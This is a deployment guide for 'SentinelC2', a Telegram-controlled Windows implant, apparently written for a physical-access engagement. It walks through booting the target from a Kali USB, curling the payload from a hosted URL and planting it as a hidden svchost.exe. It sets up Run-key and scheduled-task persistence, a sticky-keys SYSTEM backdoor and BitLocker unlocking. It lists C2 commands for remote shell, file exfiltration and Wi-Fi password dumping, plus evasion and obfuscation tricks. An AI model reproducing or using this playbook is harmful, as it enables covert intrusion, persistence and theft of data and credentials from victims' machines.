# SentinelC2 / Telegram - Quick Deployment

> Token baked into the binary: `<BOT_TOKEN_FROM_BOTFATHER>`
> Chat id: `<OPERATOR_CHAT_ID>` (@sarthakdev143)
> **Revoke the token in @BotFather after the engagement** (`/revoke` -> rebuild).

---

## What you need

| Thing | How |
| --- | --- |
| **One USB stick** (8 GB+) | Flashed with **Kali Linux live** |
| **The payload** | `telegram/build/agent_telegram_prod.exe` (403 KB) + `telegram/deploy_telegram.sh` |
| **A direct download URL** for the payload, OR the payload copied onto a second USB | Pick one (see below) |
| **Telegram app** | Logged in as @sarthakdev143 |
| **Physical access** to the target laptop while it's off/locked | ~5 minutes |

---

## One-USB workflow (recommended)

### Step 1 - Make the Kali live USB

On any Linux box (or use Rufus on Windows):

```bash
wget https://cdimage.kali.org/kali-2024.3/kali-linux-2024.3-live-amd64.iso
sudo dd if=kali-linux-2024.3-live-amd64.iso of=/dev/sdX bs=4M status=progress conv=fsync
```

### Step 2 - Get a direct download URL for the payload

Pick one:

**Option A - Google Drive / Dropbox / MEGA / your own VPS:**
1. Upload `telegram/build/agent_telegram_prod.exe` (and optionally
   `telegram/deploy_telegram.sh`) to wherever you want.
2. Get a **direct download** link (not a viewer link).
   - Drive: share -> "Anyone with the link" -> copy the link, then
     change `/file/d/.../view` to `/uc?export=download&id=...`
   - Dropbox: change `?dl=0` to `?dl=1` in the share URL
   - MEGA: get the standard share link, then use a MEGA->direct
     converter like `https://github.com/odwyersoftware/mega.py` or just
     any MEGA-direct service.
   - Your VPS: `scp agent_telegram_prod.exe user@vps:/srv/ && python3 -m http.server 8000 -d /srv/`

**Option B - Public ephemeral host (one-URL, expires in days):**

From a machine that can reach the public internet (not this build
host), run:

```powershell
cd telegram
.\upload_payload.ps1 -Agent build\agent_telegram_prod.exe
```

It tries transfer.sh -> 0x0.st -> catbox.moe -> file.io. Output is
one URL.

**Option C - Skip the second USB entirely by just downloading the
agent on the live Linux USB at deploy time** -- the deploy script
already supports `--agent=<URL>`. Just host the agent somewhere and
pass the URL. (You still need to get `deploy_telegram.sh` onto the
live USB by some means; one option: stash it in your public Notes /
gist / pastebin and `curl` it down at the start of the deploy.)

### Step 3 - Boot the target from the Kali USB

1. Plug the Kali USB into the target.
2. Power on, mash F12 (or whatever the boot-menu key is on this
   laptop). Pick the USB.
3. At the Kali boot menu, pick "Live" (or "Try without installing").

### Step 4 - Run the deploy

```bash
sudo -i
# Find the Windows partition
lsblk -f
# Look for the NTFS partition (100+ GB). Let's say it's /dev/sda2.
PART=/dev/sda2

# Mount it
mkdir -p /mnt/target
mount "$PART" /mnt/target

# Get the deploy script (any of these work)
#   - copy from the Kali USB partition (you can have a second partition
#     on the same stick with the script)
#   - curl from a gist / pastebin / your VPS
#   - re-download the zip from your hosted URL
# Easiest: just re-pull the zip and unzip it.
curl -fsSL -o /tmp/payload.zip "https://YOUR-PAYLOAD-URL/payload.zip"
unzip -o /tmp/payload.zip -d /tmp/

# Run the deploy (passes the URL -- deploy_telegram.sh will re-fetch
# the agent at deploy time, so you don't need to unpack it on the
# Kali USB)
bash /tmp/deploy_telegram.sh "$PART" --agent "https://YOUR-PAYLOAD-URL/agent_telegram_prod.exe"

# OR, if you already have the agent locally:
# bash /tmp/deploy_telegram.sh "$PART" --agent /tmp/agent_telegram.exe

# When it returns:
umount /mnt/target
reboot
```

The script:
- Mounts the Windows partition RW
- Drops the agent at `C:\ProgramData\Microsoft\Network\Connections\Cm\svchost.exe`
  (with hidden + system file attributes)
- Adds `HKLM\…\Run\MicrosoftEdgeUpdate` to the SOFTWARE hive
- Adds the same Run-key value to every user's `NTUSER.DAT`
- Drops a SYSTEM-context AtLogOn scheduled task
- Replaces `sethc.exe` with `cmd.exe` (saves original to `sethc.exe.bak`)

### Step 5 - Pull the USB and walk away

The moment the user logs in, the agent fires. Within a few seconds,
your Telegram chat with @IamSentinal_bot will show:

```
SentinelC2 / Telegram online

{"user":"victim","host":"DESKTOP-ABC123","pid":...,
 "is_admin":<true|false>, ...}
```

If you need a SYSTEM shell before the user logs in: walk up to the
locked laptop, press **Shift 5 times**, a cmd window opens as
`NT AUTHORITY\SYSTEM`.

### BitLocker (only if the target is encrypted)

```bash
# At the Kali live USB:
sudo apt install -y dislocker
mkdir -p /mnt/disk /mnt/target
dislocker "$PART" --user-recovery-password 123456-789012-345678-... /mnt/disk
mount -o rw /mnt/disk/dislocker-file /mnt/target
bash /tmp/deploy_telegram.sh /mnt/target --agent /tmp/agent_telegram.exe
umount /mnt/target
```

---

## Two-USB alternative (if you don't want to host the payload online)

Same as above, but:
1. Split the Kali USB into 2 partitions -- 1st = Kali live, 2nd = FAT32
2. Copy `agent_telegram_prod.exe` + `deploy_telegram.sh` onto the
   2nd partition
3. On the live USB, mount the 2nd partition and run the deploy from
   there directly (no curl needed):

```bash
sudo -i
lsblk -f
# Note: the payload USB is /dev/sdX1 (or whatever), the target is /dev/sdY2
mkdir -p /mnt/payload /mnt/target
mount /dev/sdX1 /mnt/payload
mount /dev/sdY2 /mnt/target
bash /mnt/payload/deploy_telegram.sh /dev/sdY2 \
    --agent /mnt/payload/agent_telegram_prod.exe
umount /mnt/target
reboot
```

The on-stick file is the most reliable path. Use this if you have
two USBs, don't want to rely on the target having internet from
the live USB, or want zero traces of the payload URL in any log.

---

## Once the agent is in

### Chat with the agent (from your phone, in the @IamSentinal_bot chat)

| Command              | What it does                                       |
| -------------------- | -------------------------------------------------- |
| `/help`              | Show command list                                  |
| `/sysinfo`           | Host, user, OS, admin status                       |
| `/cmd <cmd>`         | Run any shell command                             |
| `/screenshot`        | Capture primary desktop                            |
| `/ps` / `/kill <pid>`| Process list / kill                                |
| `/ls [path]` / `/cat <file>` / `/cd` / `/pwd` | File system |
| `/upload <path>`     | Pull a file off the target                         |
| `/drives`            | List logical drives                                |
| `/wifi`              | Dump saved Wi-Fi passwords (admin)                 |
| `/av`                | Check for AV/EDR processes                         |
| `/persist`           | Re-install Run key + scheduled task + sticky-keys  |
| `/status`            | Health check: uptime, persistence, last poll       |
| `/cleanup`           | Remove all persistence (agent stays alive)         |
| `/selfdestruct`      | Remove agent + all persistence + exit              |
| `/sleep <seconds>`   | Sleep for N seconds                                |
| `/exit`              | Kill the agent (persistence stays in place)        |

### Privilege escalation (no admin yet)

If the target user isn't admin:
1. `Shift 5x` at the lock screen -> SYSTEM cmd
2. Or `/cmd whoami /priv` and look for `SeImpersonatePrivilege`

### End of engagement

1. Send `/selfdestruct` from your Telegram chat. The agent will:
   - Remove all Run keys + scheduled task
   - Restore the original `sethc.exe` from `sethc.exe.bak`
   - Delete itself from `C:\ProgramData\Microsoft\Network\Connections\Cm\`
   - Send a final summary and exit
2. Wait for the "selfdestruct complete" message.
3. Revoke the bot token in @BotFather (`/revoke`).
4. Delete the binary from wherever you hosted it (Drive / VPS / etc).

---

## Build (admin side, one-time per engagement)

```powershell
# One-time: install Nim 2.2+ and the deps
scoop install nim
nimble install winim nimcrypto

# Build the agent with your real creds
cd "D:\Sarthak\Coding\My Codes\Cybersecurity\SentinelAgent\Nim\telegram"
$env:NIM = "D:\appdata\nim-2.2.10\bin\nim.exe"
.\build_telegram.ps1 `
    -BotToken "<BOT_TOKEN_FROM_BOTFATHER>" `
    -ChatId   "<OPERATOR_CHAT_ID>" `
    -Output   "build\agent_telegram_prod.exe"

# Pack into a single zip for easy uploading
.\pack_payload.ps1 -Output build\payload.zip

# Upload it (or skip this and upload from your own machine)
.\upload_payload.ps1 -Agent build\agent_telegram_prod.exe
```

The build script:
- Generates a fresh 16-byte XOR key per build
- XOR-encodes the bot token, chat id, and a randomized mutex name
  with that key (cleartext never lands in `.rdata`)
- Injects the encoded byte arrays into the source
- Compiles with `--opt:size --app:gui --passL:-s` (~403 KB, GUI, stripped)
- Cleans up `xorkey.nim` and the temp source

**Save the mutex seed** (printed at the end) in your op log. If you
re-deploy to the same machine and want the same mutex, pass
`-MutexSeed` on the next build. For a fresh mutex per target, just
omit it -- the script generates a new random one.

---

## Files in this directory

| File                          | Role                                           |
| ----------------------------- | ---------------------------------------------- |
| `agent_telegram.nim`          | The implant source                             |
| `build_telegram.ps1`          | Builds the .exe (per-build XOR key + compile)  |
| `pack_payload.ps1`            | Zips the agent + deploy script for upload      |
| `upload_payload.ps1`          | Uploads the zip to a public ephemeral host     |
| `deploy_telegram.sh`          | Live-Linux-USB installer (mount + persist)     |
| `install.cmd`                 | Windows-side installer (no USB, no reboot)     |
| `build/agent_telegram_prod.exe` | **The production binary** (403 KB)            |
| `build/payload.zip`           | **Zip of agent + deploy script** (184 KB)      |
| `DEPLOYMENT_GUIDE.md`         | This file                                      |
| `README.md`                   | Full operator + deploy reference               |

---

## OPSEC recap

| Concern               | Mitigation                                         |
| --------------------- | -------------------------------------------------- |
| Disk artefact         | `svchost.exe` under `ProgramData\Microsoft\Network\Connections\Cm`; hidden + system file attributes |
| Run key + task name   | `MicrosoftEdgeUpdate` / `MicrosoftEdgeUpdateTaskMachine` (matches a real MS scheduled task) |
| Mutex                 | Randomized per build (`Global\OneDriveSync<6hex>`) |
| Console window        | `--app:gui` (no console flash)                     |
| Network fingerprint   | Only outbound to `api.telegram.org:443`; UA spoofed as Chrome |
| Timing                | Poll interval randomized ±30 %                     |
| String fingerprint    | Token / chat id / mutex all XOR-encoded with a per-build key; never in `.rdata` cleartext |
| Sandbox               | Cheap host/username checks; first-run jitter; silent exit on hit |
| Self-cleanup          | `/selfdestruct` removes binary + persistence      |
| EDR / AMSI / ETW      | **Not in scope** per the engagement brief          |

The token is the only secret to keep off the wire. Everything else
(key, mutex, install paths, build artifacts) is per-engagement and
self-clearing.
